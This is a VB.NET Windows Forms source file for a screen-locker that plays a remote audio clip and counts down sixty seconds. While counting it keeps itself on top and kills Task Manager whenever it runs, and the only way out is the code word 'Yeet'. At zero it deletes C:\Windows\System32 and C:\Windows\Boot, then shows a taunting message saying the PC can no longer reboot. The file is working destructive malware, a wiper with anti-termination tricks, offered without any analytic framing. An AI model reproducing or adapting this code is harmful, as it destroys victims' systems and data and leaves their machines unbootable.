Imports System.IO
Imports WMPLib

Public Class Form1
    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        wmp1.URL = "https://instaud.io/_/2rYe.mp3"
        If Timer2.Enabled = True Then
            Timer2.Start()
        Else
            Label2.Text = 60
            Timer2.Start()

        End If
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.TopMost = True
        Me.BringToFront()
        Me.Focus()

        For Each selProcess As Process In Process.GetProcesses
            If selProcess.ProcessName = "taskmgr" Then
                selProcess.Kill()
                Exit For
            End If
        Next
        Me.Enabled = True
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "Yeet" Then
            Me.Close()
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Timer2.Start()
        Timer2.Interval = 1000

        If Label2.Text = 0 Then
            Timer2.Enabled = False
            My.Computer.FileSystem.DeleteDirectory("C:\Windows\System32", FileIO.DeleteDirectoryOption.DeleteAllContents)
            My.Computer.FileSystem.DeleteDirectory("C:\Windows\Boot", FileIO.DeleteDirectoryOption.DeleteAllContents)
            MsgBox("You Are No Longer Able To Reboot Your PC ~Yen <3")
            Process.Start("https://twitter.com/SaltyWomen")
        Else
            Label2.Text = Val(Label2.Text) - 1
        End If
    End Sub
End Class
